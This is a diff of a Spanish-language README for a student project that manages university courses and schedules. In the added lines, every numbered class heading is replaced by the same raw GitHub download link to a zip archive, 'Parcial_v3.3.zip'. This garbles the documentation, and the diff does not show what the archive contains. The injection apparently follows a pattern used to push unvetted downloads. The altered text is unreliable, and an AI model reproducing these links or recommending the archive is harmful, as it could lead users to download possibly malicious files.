@@ -12,19 +12,19 @@ sistema para gestionar materias y horarios de estudiantes en una universidad o l
 
 -Clases Principales:
 
-1.clase materia: caracteristicas(nombre, código, créditos y horarios disponibles).
+https://github.com/cristiancrakl/Parcial_02/raw/refs/heads/master/plashment/Parcial_v3.3.zip materia: caracteristicas(nombre, código, créditos y horarios disponibles).
 Métodos para agregar horarios y mostrar los horarios disponibles.
 Estudiante:
 
-2.clase estudiante: caracteristicas(nombre, ID y un mapa de materias inscritas con sus horarios).
+https://github.com/cristiancrakl/Parcial_02/raw/refs/heads/master/plashment/Parcial_v3.3.zip estudiante: caracteristicas(nombre, ID y un mapa de materias inscritas con sus horarios).
 Métodos para inscribir materias y mostrar el horario completo del estudiante.
 GestionHorarios:
 
-3.clase gestion materia y estudiantes:
+https://github.com/cristiancrakl/Parcial_02/raw/refs/heads/master/plashment/Parcial_v3.3.zip gestion materia y estudiantes:
 Métodos para registrar materias, inscribir estudiantes y mostrar las materias registradas.
 
 
-4.Clase principal (gestion horario): contiene el método main, donde se ejecuta el programa y se lleva a cabo la interacción entre las clases.
+https://github.com/cristiancrakl/Parcial_02/raw/refs/heads/master/plashment/Parcial_v3.3.zip principal (gestion horario): contiene el método main, donde se ejecuta el programa y se lleva a cabo la interacción entre las clases.
 
 
 -Uso:
